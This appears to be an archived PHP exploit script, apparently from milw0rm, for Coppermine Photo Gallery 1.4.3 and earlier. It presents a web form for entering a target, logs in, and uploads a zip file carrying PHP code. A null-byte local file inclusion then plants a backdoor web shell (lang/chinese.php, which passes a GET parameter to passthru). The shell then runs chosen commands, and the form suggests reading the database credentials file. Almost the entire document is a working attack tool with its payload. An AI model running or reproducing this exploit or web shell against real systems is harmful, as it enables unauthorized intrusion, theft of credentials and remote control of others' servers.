<?php
#  ---cpg_143_incl_xpl.php                              15.38 04/12/2005       #
#                                                                              #
#           Coppermine Photo Gallery <= 1.4.3 remote commands execution        #
#                              coded by rgod                                   #
#                     site: http://retrogod.altervista.org                     #
#                                                                              #
#  -> this works regardless of any php.ini settings, you need a normal user    #
#  account with upload rights in personal albums and at least one album        #
#                                                                              #
#  usage: launch from Apache, fill in requested fields, then go!               #
#                                                                              #
#  Sun-Tzu: "The direct and the indirect lead on to each other in turn. It is  #
#  like moving in  a circle--you never come to  an end.  Who can  exhaust the  #
#  possibilities of their combination?"                                        #

/* a short explaination:  arbitrary local inclusion issue in "lang"
   argument in init.inc.php , ex.:

   http://[target]/[path]/thumbnails.php?lang=../album/userpics/10002/shell.zip%00
   (by a null char, regardless of magic_quotes_gpc settings, because of
   Coppermine magic quotes disable code)

   we need to upload a malicious .zip file with php code inside in a personal
   album folder (no check on file contempt) and to include it (cycling inside
   folders we will search for it - a subfolder is created in album/userpics/ dir,
   it is numbered like this: 10000 + db userid).
   We don't see any ouput including it, so the .zip file install a backdoor
   called chinese.php inside Coppermine lang/ dir. Modify the .zip file code
   if you need. After first run, if succeeded, you can launch commands manually:

   http://[target]/[path]/lang/chinese.php?suntzu=netstat%20-ano

   however script checks if new "chinese language file" is already installed
                                                                              */
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
ob_implicit_flush (1);

echo'<html><head><title>**Coppermine Photo Gallery <= 1.4.3 remote cmmnds xctn**
</title><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
**Coppermine Photo Gallery <= 1.4.3 remote cmmnds xctn** </p><p class="Stile6">a
script  by  rgod  at    <a href="http://retrogod.altervista.org"target="_blank">
http://retrogod.altervista.org</a></p><table width="84%"><tr><td    width="43%">
<form name="form1" method="post"   action="'.$_SERVER[PHP_SELF].'">    <p><input
type="text"  name="host"> <span class="Stile5">* target    (ex:www.sitename.com)
</span></p> <p><input type="text" name="path">  <span class="Stile5">* path (ex:
/coppermine/ or just / ) </span></p><p><input type="text" name="cmd">      <span
class="Stile5">* specify a command ("cat ./../include/config.inc.php" to see dat
abase username & password...)</span></p><p><input  type="text" name="USER"><span
class="Stile5"> a valid USER with upload rights in personal album folder </span>
</p><p> <input  type="text" name="PASS">   <span class="Stile5"> ... and PASSWOR
D, required for STEP 1 and following... </span>  </p>  <p>  <input   type="text"
name="port"><span class="Stile5">specify  a  port other than  80 (default value)
</span></p><p><input type="text" name="proxy"><span class="Stile5">send  exploit
through an HTTP proxy (ip:port)</span></p><p> <input type="submit" name="Submit"
value="go!"></p></form></td></tr></table></body></html>';

function show($headeri)
{
  $ii=0;$ji=0;$ki=0;$ci=0;
  echo '<table border="0"><tr>';
  while ($ii <= strlen($headeri)-1){
    $datai=dechex(ord($headeri[$ii]));
    if ($ji==16) {
      $ji=0;
      $ci++;
      echo "<td>&nbsp;&nbsp;</td>";
      for ($li=0; $li<=15; $li++) {
        echo "<td>".htmlentities($headeri[$li+$ki])."</td>";
		}
      $ki=$ki+16;
      echo "</tr><tr>";
    }
    if (strlen($datai)==1) {
      echo "<td>0".htmlentities($datai)."</td>";
    }
    else {
      echo "<td>".htmlentities($datai)."</td> ";
    }
    $ii++;$ji++;
  }
  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {
    echo "<td>&nbsp&nbsp</td>";
  }
  for ($li=$ci*16; $li<=strlen($headeri); $li++) {
    echo "<td>".htmlentities($headeri[$li])."</td>";
  }
  echo "</tr></table>";
}

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //2x speed
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
    echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
  }
  else {
    $c = preg_match($proxy_regex,$proxy);
    if (!$c) {echo 'Not a valid proxy...';
    die;
    }
  echo "OK.<br>";
  echo "Attempting to connect to ".$host." on port ".$port."...<br>";
  if ($proxy=='') {
    $result = socket_connect($socket, $host, $port);
  }
  else {
    $parts =explode(':',$proxy);
    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
    $result = socket_connect($socket, $parts[0],$parts[1]);
  }
  if ($result < 0) {
    echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
  }
  else {
    echo "OK.<br><br>";
    $html= '';
    socket_write($socket, $packet, strlen($packet));
    echo "Reading response:<br>";
    while ($out= socket_read($socket, 2048)) {$html.=$out;}
    echo nl2br(htmlentities($html));
    echo "Closing socket...";
    socket_close($socket);
  }
  }
}

function refresh()
{
flush();
ob_flush();
usleep(5000000000);
}

function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.htmlentities($host); die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid prozy...';die;
    }
    $parts=explode(':',$proxy);
    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);echo nl2br(htmlentities($html));
  refresh();
}

$host=$_POST[host];$path=$_POST[path];
$port=$_POST[port];$cmd=$_POST[cmd];
$USER=$_POST[USER];$PASS=$_POST[PASS];
$proxy=$_POST[proxy];
echo "<span class=\"Stile5\">";

if (($host<>'') and ($path<>'') and ($cmd<>''))
{
               $port=intval(trim($port));
               if ($port=='') {$port=80;}
               if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
               $host=str_replace("\r","",$host);$host=str_replace("\n","",$host);
               $path=str_replace("\r","",$path);$path=str_replace("\n","",$path);
               if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
               $cmd=urlencode($cmd);

               #STEP 0 -> Check if backdoor already installed...
               $packet ="GET ".$p."lang/chinese.php?suntzu=$cmd HTTP/1.1\r\n";
               $packet.="Host: $host\r\n";
               $packet.="Connection: Close\r\n\r\n";
               show($packet);
               sendpacketii($packet);
               if (eregi("Hi Master!",$html)) {die("chinese.php already installed...<br>
                                                    Exploit succeeded...<br>"); }
               //if you are here
               if (($USER=='') | ($PASS==''))
                                              {die("chinese.php not installed<br>
                                                    we need a username and a password<br>");}
}

if (($host<>'') and ($path<>'') and ($cmd<>'') and ($USER<>'') and ($PASS<>''))
{
               #STEP 1 -> Login...
               $data="username=".urlencode($USER)."&password=".urlencode($PASS)."&submitted=Login";
               $packet ="POST ".$p."login.php?referer=index.php HTTP/1.1\r\n";
               $packet.="Referer: http://".$host.$path."login.php?referer=index.php\r\n";
               $packet.="Host: $host\r\n";
               $packet."Accept-Language: en\r\n";
               $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
               $packet.="Content-Length: ".strlen($data)."\r\n";
               $packet.="Connection: Close\r\n";
               $packet.="Cache-Control: no-cache\r\n\r\n";
               $packet.=$data;
               show($packet);
               sendpacketii($packet);
               $temp=explode("Set-Cookie: ",$html);
               $temp2=explode(" ",$temp[1]);
               $COOKIE=$temp2[0];
               $temp2=explode(" ",$temp[2]);
               $COOKIE.=" ".str_replace(";","",$temp2[0]);
               $COOKIE=str_replace("\r","",$COOKIE);$COOKIE=str_replace("\n","",$COOKIE);
               echo "COOKIE ->".htmlentities($COOKIE)."<BR>";

               #STEP 2 -> Upload the malicious zip file...
               $data='-----------------------------7d613b1d0448
Content-Disposition: form-data; name="file_upload_array[]"; filename="c:\suntzuuuu.zip"
Content-Type: application/octet-stream

<?php $sun_tzu=fopen("./lang/chinese.php","w");
fputs($sun_tzu,"<?php echo \"Hi Master!\";ini_set(\"max_execution_time\",0);passthru(\$HTTP_GET_VARS[suntzu]);?>");
fclose($sun_tzu); chmod("./lang/chinese.php",777);?>
-----------------------------7d613b1d0448
Content-Disposition: form-data; name="file_upload_array[]"; filename=""
Content-Type: application/octet-stream


-----------------------------7d613b1d0448
Content-Disposition: form-data; name="file_upload_array[]"; filename=""
Content-Type: application/octet-stream


-----------------------------7d613b1d0448
Content-Disposition: form-data; name="file_upload_array[]"; filename=""
Content-Type: application/octet-stream


-----------------------------7d613b1d0448
Content-Disposition: form-data; name="file_upload_array[]"; filename=""
Content-Type: application/octet-stream


-----------------------------7d613b1d0448
Content-Disposition: form-data; name="URI_array[]"


-----------------------------7d613b1d0448
Content-Disposition: form-data; name="URI_array[]"


-----------------------------7d613b1d0448
Content-Disposition: form-data; name="URI_array[]"


-----------------------------7d613b1d0448
Content-Disposition: form-data; name="control"

phase_1
-----------------------------7d613b1d0448--
';

               $packet ="POST ".$p."upload.php HTTP/1.1\r\n";
               $packet.="Referer: http://".$host.$path."upload.php\r\n";
               $packet.="Accept-Language: en\r\n";
               $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d613b1d0448\r\n";
               $packet.="Accept-Encoding: gzip, deflate\r\n";
               $packet.="Host: ".$host."\r\n";
               $packet.="Content-Length: ".strlen($data)."\r\n";
               $packet.="Connection: Close\r\n";
               $packet.="Cache-Control: no-cache\r\n";
               $packet.="Cookie: ".$COOKIE."\r\n\r\n";
               $packet.=$data;
               show($packet);
               sendpacketii($packet);
               $temp=explode("unique_ID\" value=\"",$html);
               $temp2=explode("\"",$temp[1]);
               $UNIQUE_ID=$temp2[0];
               echo "UNIQUE ID ->".htmlentities($UNIQUE_ID)."<BR>";


               #STEP 3 -> Select an album...
$data='-----------------------------7d6df34d0448
Content-Disposition: form-data; name="unique_ID"

'.$UNIQUE_ID.'
-----------------------------7d6df34d0448
Content-Disposition: form-data; name="control"

phase_2
-----------------------------7d6df34d0448--';

               $packet ="POST ".$p."upload.php HTTP/1.1\r\n";
               $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
               $packet.="Referer: http://".$host.$path."upload.php\r\n";
               $packet.="Accept-Language: en\r\n";
               $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6df34d0448\r\n";
               $packet.="Accept-Encoding: gzip, deflate\r\n";
               $packet.="Host: $host\r\n";
               $packet.="Content-Length: ".strlen($data)."\r\n";
               $packet.="Connection: Close\r\n";
               $packet.="Cache-Control: no-cache\r\n";
               $packet.="Cookie: ".$COOKIE."\r\n\r\n";
               $packet.=$data;
               show($packet);
               sendpacketii($packet);
               show($html);
               $junk=chr(0x0a).chr(0x20).chr(0x20).chr(0x20).chr(0x20).
                     chr(0x20).chr(0x20).chr(0x20).chr(0x20).chr(0x20).
                     chr(0x20).chr(0x20).chr(0x20).chr(0x20).chr(0x20).
                     chr(0x20).chr(0x20);
               $temp=explode("* Personal albums\">$junk<option value=\"",$html);
               $temp2=explode("\"",$temp[1]);
               $option=$temp2[0];
               if (($option=='') or (strlen($option)>2))
               { $option=1;}
               echo "ALBUM NUMBER ->".htmlentities($option)."<BR>";

               #STEP 4 -> Insert .zip file in a valid album...
$data='-----------------------------7d628b39d0448
Content-Disposition: form-data; name="album"

'.$option.'
-----------------------------7d628b39d0448
Content-Disposition: form-data; name="title"


-----------------------------7d628b39d0448
Content-Disposition: form-data; name="caption"


-----------------------------7d628b39d0448
Content-Disposition: form-data; name="keywords"


-----------------------------7d628b39d0448
Content-Disposition: form-data; name="control"

phase_2
-----------------------------7d628b39d0448
Content-Disposition: form-data; name="unique_ID"

'.$UNIQUE_ID.'
-----------------------------7d628b39d0448--
';
               $packet="POST ".$p."upload.php HTTP/1.1\r\n";
               $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
               $packet.="Referer: http://".$host.$path."upload.php\r\n";
               $packet.="Accept-Language: en\r\n";
               $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d628b39d0448\r\n";
               $packet.="Accept-Encoding: gzip, deflate\r\n";
               $packet.="Host: $host\r\n";
               $packet.="Content-Length: ".strlen($data)."\r\n";
               $packet.="Connection: Close\r\n";
               $packet.="Cache-Control: no-cache\r\n";
               $packet.="Cookie: ".$COOKIE."\r\n\r\n";
               $packet.=$data;
               show($packet);
               sendpacketii($packet);

               #STEP 5 -> Include the evil .zip file and launch commands...
               $anumber=9999;
               for ($i=0; $i<=200; $i++)
               {  $anumber++;
                  $xpl=urlencode("../albums/userpics/".$anumber."/suntzuuuu.zip".chr(0x00));
                  $packet ="GET ".$p."thumbnails.php?lang=$xpl HTTP/1.1\r\n";
                  $packet.="Host: $host\r\n";
                  $packet.="Connection: Close\r\n\r\n";
                  show($packet);
                  sendpacketii($packet);

                  $packet ="GET ".$p."lang/chinese.php?suntzu=$cmd HTTP/1.1\r\n";
                  $packet.="Host: $host\r\n";
                  $packet.="Connection: Close\r\n\r\n";
                  show($packet);
                  sendpacketii($packet);
                  if (eregi("Hi Master!",$html)) {die ("Exploit succeeded...<br>
                  you have a shell in http://".htmlentities($host.$path)."/lang/chinese.php<br>");}
               }
//if you are here...
echo "Exploit failed...";
}
echo "</span>";
?>

# milw0rm.com [2006-02-17]